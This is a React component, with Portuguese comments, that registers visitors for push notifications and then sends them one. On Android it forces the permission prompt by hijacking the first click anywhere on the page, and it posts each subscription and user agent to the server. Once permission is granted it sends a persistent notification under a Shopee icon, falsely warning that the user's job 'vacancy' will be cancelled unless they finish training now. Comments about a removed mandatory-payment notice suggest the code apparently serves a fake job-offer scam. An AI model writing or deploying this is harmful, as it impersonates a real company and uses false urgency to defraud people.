import React, { useEffect, useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { AlertTriangle } from 'lucide-react';
import axios from 'axios';

const PWANotification: React.FC = () => {
  const { toast } = useToast();
  const [hasShownNotification, setHasShownNotification] = useState(false);

  // Função para registrar usuário para push notifications
  const subscribeUserToPush = async () => {
    try {
      console.log('🔔 Iniciando registro de push notifications...');
      
      // Detectar plataforma
      const isAndroid = /Android/.test(navigator.userAgent);
      const isiOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
      
      console.log('📱 Plataforma detectada:', { isAndroid, isiOS, userAgent: navigator.userAgent });
      
      // Verificar se service worker e push são suportados
      if (!('serviceWorker' in navigator) || !('PushManager' in window)) {
        console.log('❌ Push notifications não suportadas');
        showToastNotification();
        return;
      }

      // Registrar service worker se necessário
      const registration = await navigator.serviceWorker.ready;
      console.log('✅ Service Worker pronto:', registration);

      // Verificar permissão atual
      let permission = Notification.permission;
      console.log('🔐 Permissão atual:', permission);
      
      // ANDROID: Solicitar permissão de forma mais explícita
      if (permission === 'default') {
        console.log('📱 Solicitando permissão de notificação...');
        
        // Para Android, tentar múltiplas abordagens
        if (isAndroid) {
          console.log('🤖 ANDROID: Forçando solicitação de permissão...');
          
          // Tentar primeira abordagem
          try {
            permission = await Notification.requestPermission();
            console.log('🤖 ANDROID: Primeira tentativa resultado:', permission);
          } catch (err) {
            console.log('🤖 ANDROID: Primeira tentativa falhou, tentando callback...');
            
            // Fallback para callback (Android mais antigo)
            permission = await new Promise((resolve) => {
              Notification.requestPermission((result) => {
                resolve(result);
              });
            });
            console.log('🤖 ANDROID: Callback resultado:', permission);
          }
        } else {
          // iOS e outros
          permission = await Notification.requestPermission();
          console.log('🍎 iOS/Outros: Resultado:', permission);
        }
      }

      console.log('🔐 Permissão final:', permission);
      
      if (permission === 'granted') {
        console.log('✅ Permissão concedida! Configurando push subscription...');
        // Obter chave pública VAPID atualizada
        const vapidPublicKey = 'BBAAnkFyzcnnfWoQ9DqjiY9QkQSFvScy9P_yi5LstVHcu01ja4rkYi_4ax50cZ24TTa_4aebogbVLur0NSEWHNo';
        
        // Converter chave para Uint8Array
        const convertedVapidKey = urlBase64ToUint8Array(vapidPublicKey);
        
        // Obter subscription
        const subscription = await registration.pushManager.subscribe({
          userVisibleOnly: true,
          applicationServerKey: convertedVapidKey
        });
        
        // Push subscription obtida
        
        // Enviar subscription para o servidor
        await savePushSubscription(subscription);
        
        // Enviar notificação com urgência sobre cancelamento da vaga
        new Notification('⚠️ URGENTE: Sua Vaga Pode Ser Cancelada!', {
          body: 'Complete o treinamento AGORA ou sua vaga será perdida! Vagas limitadas disponíveis.',
          icon: '/shopee-icon.jpg',
          badge: '/shopee-icon.jpg',
          tag: 'shopee-urgent-training',
          requireInteraction: true
        });
        
        // Usuário registrado para push notifications
      } else {
        // Permissão negada, usando toast
        showToastNotification();
      }
    } catch (error) {
      console.error('❌ Erro ao registrar push notifications:', error);
      showToastNotification();
    }
  };

  // Função para converter chave VAPID
  const urlBase64ToUint8Array = (base64String: string) => {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding)
      .replace(/-/g, '+')
      .replace(/_/g, '/');
    
    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);
    
    for (let i = 0; i < rawData.length; ++i) {
      outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
  };

  // Função para salvar subscription no servidor
  const savePushSubscription = async (subscription: PushSubscription) => {
    try {
      const p256dhKey = subscription.getKey('p256dh');
      const authKey = subscription.getKey('auth');
      
      const subscriptionData = {
        endpoint: subscription.endpoint,
        p256dhKey: p256dhKey ? btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(p256dhKey)))) : '',
        authKey: authKey ? btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(authKey)))) : '',
        userAgent: navigator.userAgent,
        ipAddress: '', // Será preenchido pelo backend
      };
      
      // Salvando subscription no servidor
      
      await axios.post('/api/push-subscriptions', subscriptionData);
      // Subscription salva com sucesso
    } catch (error) {
      console.error('❌ Erro ao salvar subscription:', error);
    }
  };

  // Função removida - sem notificação de pagamento obrigatório
  const showToastNotification = () => {
    // Notificação de pagamento removida conforme solicitado
  };

  // Função para tentar registrar com interação do usuário (Android)
  const requestNotificationPermissionWithClick = async () => {
    console.log('🐆 Tentando solicitação com clique do usuário...');
    
    const isAndroid = /Android/.test(navigator.userAgent);
    
    if (isAndroid && Notification.permission === 'default') {
      console.log('🤖 ANDROID: Forçando solicitação via interação...');
      
      try {
        const permission = await Notification.requestPermission();
        console.log('🤖 ANDROID: Resultado com clique:', permission);
        
        if (permission === 'granted') {
          // Se conseguiu permissão, tentar registrar push
          subscribeUserToPush();
        }
      } catch (error) {
        console.error('🤖 ANDROID: Erro ao solicitar com clique:', error);
      }
    }
  };

  useEffect(() => {
    console.log('🔍 PWANotification: Iniciando verificação...');
    
    // Verificar se está rodando em modo PWA (standalone)
    const isStandalone = window.matchMedia('(display-mode: standalone)').matches;
    const isIOSStandalone = (window.navigator as any).standalone;
    const isAndroidApp = document.referrer.includes('android-app://');
    const isPWA = isStandalone || isIOSStandalone || isAndroidApp;
    const isAndroid = /Android/.test(navigator.userAgent);
    
    console.log('📱 Detecção PWA:', { isStandalone, isIOSStandalone, isAndroidApp, isPWA, isAndroid });

    // Verificar se já mostrou a notificação nesta sessão
    const notificationShown = sessionStorage.getItem('pwa_payment_notification_shown');
    console.log('💾 Notificação já mostrada:', notificationShown);

    // SEMPRE tentar registrar push notifications
    console.log('🔔 Preparando registro de push notifications...');
    
    // Para Android, aguardar mais tempo e tentar na carga
    const delay = isAndroid ? 3000 : 2000;
    
    const timer = setTimeout(() => {
      console.log('⏰ Timer executado, iniciando registro...');
      
      // Tentar registrar para push notifications
      subscribeUserToPush();
      
      // Para Android, adicionar listener de clique como fallback
      if (isAndroid && Notification.permission === 'default') {
        console.log('🤖 ANDROID: Adicionando listener de clique como fallback...');
        
        // Adicionar listener global para qualquer clique
        const handleFirstClick = () => {
          console.log('🐆 Primeiro clique detectado no Android!');
          requestNotificationPermissionWithClick();
          document.removeEventListener('click', handleFirstClick);
        };
        
        document.addEventListener('click', handleFirstClick, { once: true });
      }
      
      // Marcar que a notificação foi mostrada nesta sessão
      sessionStorage.setItem('pwa_payment_notification_shown', 'true');
      setHasShownNotification(true);
    }, delay);

    return () => clearTimeout(timer);
  }, [toast, hasShownNotification]);

  return null; // Este componente não renderiza nada visível
};

export default PWANotification;